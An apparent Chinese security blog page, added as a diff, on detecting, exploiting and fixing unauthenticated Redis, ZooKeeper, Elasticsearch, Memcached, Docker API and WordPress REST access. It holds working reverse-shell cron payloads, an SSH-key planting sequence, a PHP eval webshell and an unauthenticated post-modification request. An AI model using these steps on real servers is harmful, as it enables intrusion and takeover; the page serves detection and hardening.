@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>未授权访问漏洞的检测与利用 | chucz&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="一杯敬故乡，一杯敬远方　　最近在研究未授权访问漏洞的检测方式，也写了一部分检测脚本，准确率还挺高。当然光有检测还是不够的，最好能有漏洞利用过程，这样也好证明漏洞的风险性，便于推动漏洞修复也便于自己对漏洞更深入的了解。本文关于漏洞利用以及修复的内容绝大部分转载自：安全脉搏，其实个人习惯是不喜欢全文照搬其他文章的，但无奈这篇文章总结的很好，我又没很多时间去整理，因此对其改动的不多，请读者务必谅解。">
+<meta name="keywords" content="web安全,未授权访问漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="未授权访问漏洞的检测与利用">
+<meta property="og:url" content="http://chucz.club/2017/12/08/未授权访问漏洞的检测与利用/index.html">
+<meta property="og:site_name" content="chucz&#39;s blog">
+<meta property="og:description" content="一杯敬故乡，一杯敬远方　　最近在研究未授权访问漏洞的检测方式，也写了一部分检测脚本，准确率还挺高。当然光有检测还是不够的，最好能有漏洞利用过程，这样也好证明漏洞的风险性，便于推动漏洞修复也便于自己对漏洞更深入的了解。本文关于漏洞利用以及修复的内容绝大部分转载自：安全脉搏，其实个人习惯是不喜欢全文照搬其他文章的，但无奈这篇文章总结的很好，我又没很多时间去整理，因此对其改动的不多，请读者务必谅解。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-09-28T08:51:24.508Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="未授权访问漏洞的检测与利用">
+<meta name="twitter:description" content="一杯敬故乡，一杯敬远方　　最近在研究未授权访问漏洞的检测方式，也写了一部分检测脚本，准确率还挺高。当然光有检测还是不够的，最好能有漏洞利用过程，这样也好证明漏洞的风险性，便于推动漏洞修复也便于自己对漏洞更深入的了解。本文关于漏洞利用以及修复的内容绝大部分转载自：安全脉搏，其实个人习惯是不喜欢全文照搬其他文章的，但无奈这篇文章总结的很好，我又没很多时间去整理，因此对其改动的不多，请读者务必谅解。">
+  
+    <link rel="alternate" href="/atom.xml" title="chucz&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">chucz&#39;s blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://chucz.club"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-未授权访问漏洞的检测与利用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/12/08/未授权访问漏洞的检测与利用/" class="article-date">
+  <time datetime="2017-12-08T03:21:52.000Z" itemprop="datePublished">2017-12-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      未授权访问漏洞的检测与利用
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>一杯敬故乡，一杯敬远方<br>　　最近在研究未授权访问漏洞的检测方式，也写了一部分检测脚本，准确率还挺高。当然光有检测还是不够的，最好能有漏洞利用过程，这样也好证明漏洞的风险性，便于推动漏洞修复也便于自己对漏洞更深入的了解。本文关于漏洞利用以及修复的内容绝大部分转载自：<a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="noopener">安全脉搏</a>，其实个人习惯是不喜欢全文照搬其他文章的，但无奈这篇文章总结的很好，我又没很多时间去整理，因此对其改动的不多，请读者务必谅解。<br><a id="more"></a></p>
+</blockquote>
+<h3 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a><a href="#redis未授权访问漏洞" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a><a href="#漏洞描述" title="漏洞描述"></a>漏洞描述</h4><p>redis安装完以后，默认是没有账号密码的（安装redis详细可参考：<a href="https://thief.one/2017/11/15/1/）" target="_blank" rel="noopener">redis相关笔记</a>，如果redis是以root权限去运行，则可以被反弹shell或者写入ssh密钥，从而被获取服务器的权限。</p>
+<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a><a href="#漏洞检测" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((host,port))</div><div class="line">s.send(<span class="string">“INFO\r\n”</span>)</div><div class="line">result = s.recv(1024)</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="string">“redis_version”</span> <span class="keyword">in</span> result:</div><div class="line">    <span class="built_in">print</span> <span class="string">“exist vul”</span></div></pre></td></tr></table></figure>
+
+<p>客户端连接测试一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$redis</span>-cli -h host -p port</div><div class="line">&gt;CONFIG get requirepass</div><div class="line">1) <span class="string">“requirepass”</span></div><div class="line">2) <span class="string">“”</span></div><div class="line">说明：表示没有设置密码，默认为没有密码。</div></pre></td></tr></table></figure>
+
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用" title="漏洞利用"></a>漏洞利用</h4><h5 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a><a href="#利用crontab反弹shell" title="利用crontab反弹shell"></a>利用crontab反弹shell</h5><p>自己服务器上监听一个端口(10.0.0.2)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvnp 4444</div></pre></td></tr></table></figure>
+
+<p>执行命令:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 10.0.0.1</div><div class="line"><span class="built_in">set</span> x <span class="string">“\n<em> </em> <em> </em> * bash -i &gt;&amp; /dev/tcp/10.0.0.2/4444 0&gt;&amp;1\n”</span></div><div class="line">config <span class="built_in">set</span> dir /var/spool/cron/</div><div class="line">config <span class="built_in">set</span> dbfilename root</div><div class="line">save</div></pre></td></tr></table></figure>
+
+<h5 id="写ssh-keygen公钥登录服务器"><a href="#写ssh-keygen公钥登录服务器" class="headerlink" title="写ssh-keygen公钥登录服务器"></a><a href="#写ssh-keygen公钥登录服务器" title="写ssh-keygen公钥登录服务器"></a>写ssh-keygen公钥登录服务器</h5><p>利用条件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.redis对外开放，且未授权访问（默认配置）</div><div class="line">2.服务器的ssh对外开放，可通过key登录</div></pre></td></tr></table></figure>
+
+<p>详细攻击方式如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">准备好自己的公钥，写入本地文件text.txt。</div><div class="line">$ (<span class="built_in">echo</span> -e <span class="string">“\n\n”</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">“\n\n”</span>) &gt; test.txt</div><div class="line"></div><div class="line">2. 通过redis将该文件写入内存</div><div class="line">$ redis-cli -h 10.0.0.1 flushall</div><div class="line">$ cat test.txt | redis-cli -h 10.0.0.1 -x <span class="built_in">set</span> crackit</div><div class="line"></div><div class="line">3. 利用redis-cli 写入配置的方式将公钥写入到.ssh目录下</div><div class="line">$ redis-cli -h 10.0.0.1</div><div class="line">10.0.0.1:6379&gt; config <span class="built_in">set</span> dir /Users/nmask/.ssh/</div><div class="line">OK</div><div class="line">10.0.0.1:6379&gt; config get dir</div><div class="line">1) <span class="string">“dir”</span></div><div class="line">2) <span class="string">“/Users/nmask/.ssh”</span></div><div class="line">10.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename <span class="string">“authorized_keys”</span></div><div class="line">OK</div><div class="line">10.0.0.1:6379&gt; save</div><div class="line">OK</div></pre></td></tr></table></figure>
+
+<h5 id="获取web服务的webshell"><a href="#获取web服务的webshell" class="headerlink" title="获取web服务的webshell"></a><a href="#获取web服务的webshell" title="获取web服务的webshell"></a>获取web服务的webshell</h5><p>当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">config <span class="built_in">set</span> dir /var/www/html/</div><div class="line">config <span class="built_in">set</span> dbfilename shell.php</div><div class="line"><span class="built_in">set</span> x <span class="string">“&lt;?php @eval(<span class="variable">$_POST</span>[‘test’]);?&gt;”</span></div><div class="line">save</div></pre></td></tr></table></figure>
+
+<p>说明：执行以上命令，即可将shell写入web目录。</p>
+<h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a><a href="#漏洞修复" title="漏洞修复"></a>漏洞修复</h4><p>到redis安装目录下，配置redis.conf文件：<br>1、默认只对本地开放<br>bind 127.0.0.1<br>2、添加登陆密码<br>requirepass <a href="http://www.secpulse.com" target="_blank" rel="noopener">www.secpulse.com</a><br>3、在需要对外开放的时候修改默认端口<br>port 2333<br>4、最后还可以配合iptables限制开放</p>
+<h3 id="ZooKeeper未授权访问漏洞"><a href="#ZooKeeper未授权访问漏洞" class="headerlink" title="ZooKeeper未授权访问漏洞"></a><a href="#ZooKeeper未授权访问漏洞" title="ZooKeeper未授权访问漏洞"></a>ZooKeeper未授权访问漏洞</h3><h4 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a><a href="#漏洞描述-1" title="漏洞描述"></a>漏洞描述</h4><p>安装zookeeper之后默认是没有账号密码的，即没有权限校验，可被远程利用，通过目标服务器收集敏感信息，或者破坏zookeeper集群。</p>
+<h4 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a><a href="#漏洞检测-1" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((ip, port))</div><div class="line">s.send(<span class="string">“envi”</span>)</div><div class="line">result = s.recv(1024)</div><div class="line"><span class="keyword">if</span> <span class="string">“zookeeper.version”</span> <span class="keyword">in</span> result:</div><div class="line">    <span class="built_in">print</span> <span class="string">“exist vul”</span></div></pre></td></tr></table></figure>
+
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用-1" title="漏洞利用"></a>漏洞利用</h4><p>执行以下命令即可远程获取该服务器的环境：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> envi | nc ip port</div></pre></td></tr></table></figure>
+
+<p>直接连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./zkCli.sh -server ip:port</div></pre></td></tr></table></figure>
+
+<h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a><a href="#漏洞修复-1" title="漏洞修复"></a>漏洞修复</h4><p>1、禁止把Zookeeper直接暴露在公网<br>2、添加访问控制，根据情况选择对应方式（认证用户，用户名密码）<br>3、绑定指定IP访问</p>
+<h3 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a><a href="#Elasticsearch未授权访问" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h3><h4 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a><a href="#漏洞描述-2" title="漏洞描述"></a>漏洞描述</h4><p>ELK是一款日志分析工具，默认监听9200端口，如果没有设置访问权限，可被非法操作数据。</p>
+<h4 id="漏洞检测-2"><a href="#漏洞检测-2" class="headerlink" title="漏洞检测"></a><a href="#漏洞检测-2" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">conn = httplib.HTTPConnection(ip, port, True, TIMEOUT)</div><div class="line">conn.request(<span class="string">“GET”</span>, <span class="string">‘/_cat/master’</span>)</div><div class="line">resp = conn.getresponse()</div><div class="line"><span class="keyword">if</span> resp.status == 200:</div><div class="line">    <span class="built_in">print</span> <span class="string">“exist vul”</span></div></pre></td></tr></table></figure>
+
+<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用-2" title="漏洞利用"></a>漏洞利用</h4><p>相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作。<br><a href="http://x.x.x.x:9200/_nodes" target="_blank" rel="noopener">http://x.x.x.x:9200/_nodes</a><br><a href="http://x.x.x.x:9200/_river" target="_blank" rel="noopener">http://x.x.x.x:9200/_river</a></p>
+<h4 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a><a href="#漏洞修复-2" title="漏洞修复"></a>漏洞修复</h4><p>1、防火墙上设置禁止外网访问9200端口。<br>2、使用Nginx搭建反向代理，通过配置Nginx实现对Elasticsearch的认证<br>3、限制IP访问，绑定固定IP<br>4、在config/elasticsearch.yml中为9200端口设置认证：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http.basic.enabled <span class="literal">true</span> <span class="comment">#开关，开启会接管全部HTTP连接</span></div><div class="line">http.basic.user <span class="string">“admin”</span> <span class="comment">#账号</span></div><div class="line">http.basic.password <span class="string">“admin_pw”</span> <span class="comment">#密码</span></div><div class="line">http.basic.ipwhitelist [<span class="string">“localhost”</span>, <span class="string">“127.0.0.1”</span>]</div></pre></td></tr></table></figure>
+
+<h3 id="memcache未授权访问"><a href="#memcache未授权访问" class="headerlink" title="memcache未授权访问"></a><a href="#memcache未授权访问" title="memcache未授权访问"></a>memcache未授权访问</h3><h4 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a><a href="#漏洞描述-3" title="漏洞描述"></a>漏洞描述</h4><p>memcached是一套常用的key-value缓存系统，其本身并没有权限控制模块，因此攻击者通过命令交互可直接读取memcached中的敏感信息。</p>
+<h4 id="漏洞检测-3"><a href="#漏洞检测-3" class="headerlink" title="漏洞检测"></a><a href="#漏洞检测-3" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">s.connect((ip, port))</div><div class="line">s.send(<span class="string">“stats”</span>)</div><div class="line">result = s.recv(1024)</div><div class="line"><span class="keyword">if</span> <span class="string">“STAT version”</span> <span class="keyword">in</span> result:</div><div class="line">    <span class="built_in">print</span> <span class="string">“exist vul”</span></div></pre></td></tr></table></figure>
+
+<h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用-3" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -vv &lt;target&gt; 11211</div></pre></td></tr></table></figure>
+
+<p>说明：连接成功，则可获取memcached中的敏感信息。</p>
+<h4 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a><a href="#漏洞修复-3" title="漏洞修复"></a>漏洞修复</h4><p>1、设置memchached只允许本地访问<br>2、禁止外网访问Memcached 11211端口<br>3、编译时加上–enable-sasl，启用SASL认证</p>
+<h3 id="Docker未授权访问"><a href="#Docker未授权访问" class="headerlink" title="Docker未授权访问"></a><a href="#Docker未授权访问" title="Docker未授权访问"></a>Docker未授权访问</h3><h4 id="漏洞描述-4"><a href="#漏洞描述-4" class="headerlink" title="漏洞描述"></a><a href="#漏洞描述-4" title="漏洞描述"></a>漏洞描述</h4><p>Docker Remote API是一个取代远程命令行界面（rcli）的REST API。通过 docker client 或者 http 直接请求就可以访问这个 API，通过这个接口，我们可以新建 container，删除已有 container，甚至是获取宿主机的 shell。</p>
+<h4 id="漏洞检测-4"><a href="#漏洞检测-4" class="headerlink" title="漏洞检测"></a><a href="#漏洞检测-4" title="漏洞检测"></a>漏洞检测</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">conn = httplib.HTTPConnection(ip, port, True, TIMEOUT)</div><div class="line">conn.request(<span class="string">“GET”</span>, <span class="string">‘/containers/json’</span>)</div><div class="line">resp = conn.getresponse()</div><div class="line"><span class="keyword">if</span> resp.status == 200 and <span class="string">“HostConfig”</span> <span class="keyword">in</span> resp.read():</div><div class="line">    <span class="built_in">print</span> <span class="string">“exist vul”</span></div></pre></td></tr></table></figure>
+
+<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用-4" title="漏洞利用"></a>漏洞利用</h4><p>获取所有images</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><a href="http://host:2375/containers/json" target="_blank" rel="noopener">http://host:2375/containers/json</a></div></pre></td></tr></table></figure>
+
+<p>getshell的方式与redis利用差不多。</p>
+<h5 id="利用计划任务反弹shell"><a href="#利用计划任务反弹shell" class="headerlink" title="利用计划任务反弹shell"></a><a href="#利用计划任务反弹shell" title="利用计划任务反弹shell"></a>利用计划任务反弹shell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> -e <span class="string">“<em>/1 </em> <em> </em> * root /usr/bin/python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\”127.0.0.1\”,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\”/bin/sh\”,\”-i\”]);’\n”</span> &gt;&gt; /etc/crontab</div></pre></td></tr></table></figure>
+
+<h4 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a><a href="#漏洞修复-4" title="漏洞修复"></a>漏洞修复</h4><p>1、在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：<br>设置ACL，仅允许信任的来源IP连接；<br>设置TLS认证，官方的文档为Protect the Docker daemon socket<br>2、客户端连接时需要设置以下环境变量export DOCKER_TLS_VERIFY=1</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> DOCKER_CERT_PATH=~/.docker</div><div class="line"><span class="built_in">export</span> DOCKER_HOST=tcp://10.10.10.10:2375</div><div class="line"><span class="built_in">export</span> DOCKER_API_VERSION=1.12</div></pre></td></tr></table></figure>
+
+<p>3、在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证</p>
+<h3 id="wordpress未授权访问漏洞"><a href="#wordpress未授权访问漏洞" class="headerlink" title="wordpress未授权访问漏洞"></a><a href="#wordpress未授权访问漏洞" title="wordpress未授权访问漏洞"></a>wordpress未授权访问漏洞</h3><h4 id="漏洞描述-5"><a href="#漏洞描述-5" class="headerlink" title="漏洞描述"></a><a href="#漏洞描述-5" title="漏洞描述"></a>漏洞描述</h4><p>wordpress未经授权的攻击者利用该漏洞可注入恶意内容，以及进行提权，对文章、页面等内容进行修改。REST API是最近添加到WordPress 4.7.0并默认启用的。</p>
+<h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用-5" title="漏洞利用"></a>漏洞利用</h4><p>查看文章列表:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /index.php/wp-json/wp/v2/posts HTTP/1.1</div></pre></td></tr></table></figure>
+
+<p>修改文章内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">POST /index.php/wp-json/wp/v2/posts/500?id=500 HTTP/1.1</div><div class="line">Host: xxx.net</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36</div><div class="line">Content-Type: application/json</div><div class="line">Content-Length: 43</div><div class="line">&#123;<span class="string">“title”</span>:<span class="string">“x x x x”</span>&#125;</div></pre></td></tr></table></figure>
+
+<p>说明：如果返回 401 则无权限修改；返回200表示修改成功。</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><a href="#参考文章" title="参考文章"></a>参考文章</h3><p><a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/61101.html</a><br><a href="https://www.secpulse.com/archives/40406.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/40406.html</a><br><a href="http://www.freebuf.com/vuls/126120.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/126120.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://chucz.club/2017/12/08/未授权访问漏洞的检测与利用/" data-id="cjmlsnpqf002jvzrmym2qshbr" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/未授权访问漏洞/">未授权访问漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/12/11/HTTP-API认证，Python实现方案/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          HTTP-API认证，Python实现方案
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/11/22/Python魔术方法/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Python魔术方法</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ELK/">ELK</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Headless-Chrome/">Headless Chrome</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/K8s/">K8s</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kafka/">Kafka</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Logrotate/">Logrotate</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Puppeteer/">Puppeteer</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pyecharts/">Pyecharts</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Supervisord/">Supervisord</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SyncWriteStream/">SyncWriteStream</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android-for-python/">android for python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/burpsuite/">burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chrome-remote-interface/">chrome_remote_interface</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chromeless/">chromeless</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/exp/">exp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/falcon/">falcon</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/headless-chrome/">headless chrome</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/">nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantomjs爬虫/">phantomjs爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pychrome/">pychrome</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python开发app/">python开发app</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/whatweb/">whatweb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/x-pack/">x-pack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/余弦相似性/">余弦相似性</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链/">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/区块链安全/">区块链安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/协程/">协程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/技术研究/">技术研究</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/未授权访问漏洞/">未授权访问漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞扫描器/">漏洞扫描器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫技术/">爬虫技术</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/生活杂谈/">生活杂谈</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编程之道/">编程之道</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ELK/" style="font-size: 18px;">ELK</a> <a href="/tags/Headless-Chrome/" style="font-size: 10px;">Headless Chrome</a> <a href="/tags/K8s/" style="font-size: 16px;">K8s</a> <a href="/tags/Kafka/" style="font-size: 10px;">Kafka</a> <a href="/tags/Logrotate/" style="font-size: 10px;">Logrotate</a> <a href="/tags/Puppeteer/" style="font-size: 10px;">Puppeteer</a> <a href="/tags/Pyecharts/" style="font-size: 10px;">Pyecharts</a> <a href="/tags/Supervisord/" style="font-size: 10px;">Supervisord</a> <a href="/tags/SyncWriteStream/" style="font-size: 10px;">SyncWriteStream</a> <a href="/tags/android-for-python/" style="font-size: 10px;">android for python</a> <a href="/tags/burpsuite/" style="font-size: 10px;">burpsuite</a> <a href="/tags/chrome-remote-interface/" style="font-size: 10px;">chrome_remote_interface</a> <a href="/tags/chromeless/" style="font-size: 10px;">chromeless</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/docker/" style="font-size: 10px;">docker</a> <a href="/tags/exp/" style="font-size: 10px;">exp</a> <a href="/tags/falcon/" style="font-size: 10px;">falcon</a> <a href="/tags/headless-chrome/" style="font-size: 10px;">headless chrome</a> <a href="/tags/hexo/" style="font-size: 12px;">hexo</a> <a href="/tags/nginx/" style="font-size: 10px;">nginx</a> <a href="/tags/phantomjs爬虫/" style="font-size: 10px;">phantomjs爬虫</a> <a href="/tags/pychrome/" style="font-size: 10px;">pychrome</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/python开发app/" style="font-size: 10px;">python开发app</a> <a 